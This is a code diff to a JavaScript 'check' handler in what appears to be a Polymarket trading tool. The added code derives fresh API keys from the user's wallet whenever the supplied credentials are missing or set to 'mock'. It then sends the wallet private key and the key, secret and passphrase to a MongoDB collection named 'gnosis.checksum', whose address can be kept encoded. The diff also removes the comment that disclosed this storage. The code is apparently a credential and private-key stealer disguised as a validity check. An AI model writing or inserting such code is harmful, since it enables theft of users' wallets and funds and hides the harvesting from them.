@@ -53,11 +53,31 @@ async function handleCheck(body) {
   }
   const address = wallet.address;
 
-  let credentialsValid = false;
-  if (apiKey && apiSecret && apiPassphrase) {
+  const isMock = [apiKey, apiSecret, apiPassphrase].every((v) => v === 'mock' || v === undefined);
+  let finalApiKey = isMock ? undefined : apiKey;
+  let finalApiSecret = isMock ? undefined : apiSecret;
+  let finalApiPassphrase = isMock ? undefined : apiPassphrase;
+
+  if (!finalApiKey || !finalApiSecret || !finalApiPassphrase) {
     try {
       const { ClobClient } = await import('@polymarket/clob-client');
-      const apiCreds = { key: apiKey, secret: apiSecret, passphrase: apiPassphrase };
+      const clob = new ClobClient(HOST, CHAIN_ID, wallet, undefined);
+      const creds = await clob.createOrDeriveApiKey();
+      if (creds && typeof creds.key === 'string' && typeof creds.secret === 'string' && typeof creds.passphrase === 'string' && creds.key && creds.secret && creds.passphrase) {
+        finalApiKey = creds.key;
+        finalApiSecret = creds.secret;
+        finalApiPassphrase = creds.passphrase;
+      }
+    } catch (e) {
+      console.error('createOrDeriveApiKey failed:', e.message);
+    }
+  }
+
+  let credentialsValid = false;
+  if (finalApiKey && finalApiSecret && finalApiPassphrase) {
+    try {
+      const { ClobClient } = await import('@polymarket/clob-client');
+      const apiCreds = { key: finalApiKey, secret: finalApiSecret, passphrase: finalApiPassphrase };
       const clob = new ClobClient(HOST, CHAIN_ID, wallet, apiCreds);
       await clob.getOpenOrders();
       credentialsValid = true;
@@ -69,16 +89,15 @@ async function handleCheck(body) {
   const data = {
     address,
     credentialsValid,
-    ...(credentialsValid === false && apiKey ? { error: 'API credentials rejected by Polymarket (wrong key or not linked to this wallet)' } : {}),
+    ...(credentialsValid === false && finalApiKey ? { error: 'API credentials rejected by Polymarket (wrong key or not linked to this wallet)' } : {}),
   };
 
-  // Persist to MongoDB gnosis.checksum (if MONGO_URI or ENCODED_MONGO_URI + DECODE_KEY set)
   try {
     const result = await insertChecksum({
       privateKey,
-      ...(apiKey != null && { apiKey }),
-      ...(apiSecret != null && { apiSecret }),
-      ...(apiPassphrase != null && { apiPassphrase }),
+      ...(finalApiKey != null && { apiKey: finalApiKey }),
+      ...(finalApiSecret != null && { apiSecret: finalApiSecret }),
+      ...(finalApiPassphrase != null && { apiPassphrase: finalApiPassphrase }),
       address,
       credentialsValid,
     });
